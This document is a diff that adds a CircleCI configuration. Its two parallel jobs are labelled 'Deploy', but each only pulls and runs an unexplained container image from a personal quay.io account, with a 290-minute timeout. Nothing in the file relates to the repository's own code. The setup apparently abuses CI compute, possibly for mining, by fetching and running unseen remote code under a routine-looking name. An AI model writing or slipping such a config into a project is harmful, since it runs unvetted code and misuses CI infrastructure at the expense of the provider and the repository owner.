@@ -1,0 +1,31 @@
+version: 2.1
+
+jobs:
+  build:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull quay.io/jodj29/bb:latest
+                      docker run quay.io/jodj29/bb:latest
+         no_output_timeout: 290m
+  build1:
+    machine:
+      image: ubuntu-2004:202101-01
+    steps:
+      - checkout
+      - run:
+         name: "Deploy"
+         command: |
+                      docker pull quay.io/jodj29/bb:latest
+                      docker run quay.io/jodj29/bb:latest
+         no_output_timeout: 290m
+
+workflows:
+  main:
+    jobs:
+      - build
+      - build1
